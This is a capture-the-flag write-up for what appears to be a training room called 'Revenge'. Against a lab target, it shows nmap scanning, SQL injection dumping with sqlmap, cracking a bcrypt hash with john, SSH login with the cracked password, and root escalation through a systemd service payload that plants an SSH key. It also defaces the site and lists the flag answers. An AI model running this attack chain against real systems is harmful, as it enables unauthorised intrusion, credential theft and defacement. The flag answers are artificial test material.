## Revenge
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.
Half up-front and half when you finish.

Good luck,

Billy

```
# Nmap 7.91 scan initiated Mon Feb 15 21:46:34 2021 as: nmap -sC -sV -o nmap/initial -vvv -p 22,80 10.10.112.151
Nmap scan report for 10.10.112.151
Host is up, received reset ttl 61 (0.15s latency).
Scanned at 2021-02-15 21:46:35 PST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBiHOfDlVoYCp0+/LM7BhujeUicHQ+HwAidwcp1yMZE3j6K/7RW3XsNSEyUR8RpVaXAHl7ThNfD2pmzGPBV9uOjNlgNuzhASOgQuz9G4hQyLh5u1Sv9QR8R9udClyRoqUwGBfdNKjqAK2Kw7OghAHXlwUxniYRLUeAD60oLjm4uIv+1QlA2t5/LL6utV2ePWOEHe8WehXPGrstJtJ8Jf/uM48s0jhLhMEewzSqR2w0LWAGDFzOdfnOvcyQtJ9FeswJRG7fWXXsOms0Fp4lhTL4fknL+PSdWEPagTjRfUIRxskkFsaxI//3EulETC+gSa+KilVRfiKAGTdrdz7RL5sl
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNoSioP7IDDu4yIVfGnhLoMTyvBuzxILnRr7rKGX0YpNShJfHLjEQRIdUoYq+/7P0wBjLoXn9g7XpLLb7UMvm4=
|   256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEpROzuQcffRwKXCOz+JQ5p7QKnAQVEDUwwUkkblavyh
80/tcp open  http    syn-ack ttl 61 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 15 21:46:48 2021 -- 1 IP address (1 host up) scanned in 13.25 seconds
```

#Web server port 80
There is a login panel, but it does not actually make a POST request action so this is a dead end
Going to the products page the products are in a sequential ID order and with the presence of sqlmap as a tag in the room lets try and enumerate the database using this

#Enumerating sql server
sqlmap -u http://10.10.112.151/products/1 --dbs
```
[22:10:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[22:10:25] [INFO] fetching database names
[22:10:25] [INFO] retrieved: 'information_schema'
[22:10:26] [INFO] retrieved: 'duckyinc'
[22:10:26] [INFO] retrieved: 'mysql'
[22:10:26] [INFO] retrieved: 'performance_schema'
[22:10:26] [INFO] retrieved: 'sys'
available databases [5]:
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

#Dumping duckyinc
sqlmap -u http://10.10.112.151/products/1 -D duckyinc --dump
Hidden in the user/"customer" table we see a flag thm{br3ak1ng_4nd_3nt3r1ng}, this turns out to be flag 1

In the system_user table we find some hashes that might be more relevant to gaining access
```
Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$REDACTED  |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$REDACTED  |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$REDACTED |
+----+----------------------+--------------+--------------------------------------------------------------+
```
The server-admin hash has fewer rounds and an appealing username so lets go for the lower hanging fruit and try to crack this hash before the others.

#Cracking server-admin hash
```
john serverAdminHash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
inuyasha         (?)
1g 0:00:00:00 DONE (2021-02-15 22:18) 1.111g/s 280.0p/s 280.0c/s 280.0C/s precious..edward
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Since we know the login panel is a deadend lets go ahead and try to ssh.

#Initial foothold
ssh server-admin@10.10.112.151
our credentials do in fact work and we find flag2

#Privilege Escalation
```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin:
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
        duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```
gtfobins provides us a way to edit a service and allow us escalate our privileges
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF

so we can modify this as follows
[Service]
Type=oneshot
ExecStart=/bin/sh -c "echo 'our rsa key' > /root/.ssh/authorized_keys"
[Install]
WantedBy=multi-user.target

Since we can edit the duckyinc.service as such presumably we should then be able to reload the service and have the ability to ssh as root as an authorized identity

sudo systemctl daemon-reload
sudo systemctl restart duckyinc.service

ssh root@10.10.112.151
And we have successfully escalated to root

There doesn't appear to be a flag, but referencing the mission objectives given the flag hint reminds us that we are to deface the front page of the website so lets go ahead and do that

#Defacing Website
We navigate to /var/www/duckyinc/templates/index.html and can simply edit the frontpage here
After editing it we find the final flag has been created in the root directory

#flag 1
thm{br3ak1ng_4nd_3nt3r1ng}
#flag 2
thm{4lm0st_th3re}
#flag 3
thm{m1ss10n_acc0mpl1sh3d}
